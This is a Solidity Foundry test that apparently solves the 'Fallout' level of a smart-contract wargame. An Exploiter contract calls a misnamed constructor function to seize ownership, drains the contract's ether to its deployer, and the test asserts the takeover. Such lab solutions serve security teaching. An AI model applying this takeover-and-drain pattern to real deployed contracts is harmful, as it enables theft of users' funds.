pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "forge-std/console2.sol";

import "src/03.sol";

contract Exploiter {
    address owner;
    
    constructor() payable {
        require(msg.value == 1 ether);
        owner = msg.sender;
    }

    function exploit(Fallout instance) external {
        instance.Fal1out{value: address(this).balance}();

        instance.collectAllocations();

        (bool success, ) = address(owner).call{value: address(this).balance}("");
        require(success, "Error Withdraw from exploit");
    }

    receive() external payable { }
}

contract Test03 is Test {

    Fallout instance;
    address user = address(0x1);

    function setUp() public {
        instance = new Fallout();

        vm.deal(address(instance), 1 ether);
        vm.deal(user, 1 ether);
    }

    function testSolve() public {
        address beforeOwner = instance.owner();
        uint userBalanceBefore = user.balance;

        console.log("Owner before exploit: ", beforeOwner);
        console.log("User balance before exploit (ether): ", userBalanceBefore / 1e18);

        vm.startPrank(user);
        
        Exploiter exploiter = new Exploiter{value: 1 ether}();
        exploiter.exploit(instance);
        
        vm.stopPrank();

        uint instanceBalance = address(instance).balance;
        
        address afterOwner = instance.owner();
        
        assertEq(instanceBalance, 0);
        assertEq(afterOwner, address(exploiter));
        console.log("");
        console.log("Owner after exploit: ", afterOwner);
        console.log("User balance after exploit (ether): ", user.balance / 1e18);
    }


}